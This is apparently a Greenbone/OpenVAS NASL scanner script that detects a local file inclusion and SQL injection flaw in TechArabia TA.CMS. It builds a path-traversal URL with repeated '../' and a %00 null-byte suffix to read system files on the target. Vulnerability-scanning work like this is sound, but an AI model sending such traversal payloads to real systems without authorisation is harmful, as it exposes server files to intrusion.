# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103346");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-11-24 10:43:43 +0100 (Thu, 24 Nov 2011)");
  script_name("TechArabia TA.CMS LFI/SQLi Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50773");

  script_tag(name:"summary", value:"TechArabia TA.CMS is prone to multiple local file include (LFI)
  and SQL injection (SQLi) vulnerabilities.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to compromise the
  application, access or modify data, exploit latent vulnerabilities in the underlying database,
  and view and execute arbitrary local files within the context of the webserver.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/cms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/index.php" );

  # e.g.:
  # <a href="index.php?page_id=123">
  # <a href="?module=foo&amp;page=list">
  # <a href="index.php?module=bar&amp;page=form">
  if( ! res || res !~ "^HTTP/1\.[01] 200" || res !~ '<a href="[^?]*\\?(module|page_id)=.+' )
    continue;

  foreach pattern( keys( files ) ) {

    file = files[pattern];
    url = string( dir, "/?lang=", crap( data:"../", length:9*3 ), file, "%00.png&amp;p_id=60" );

    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
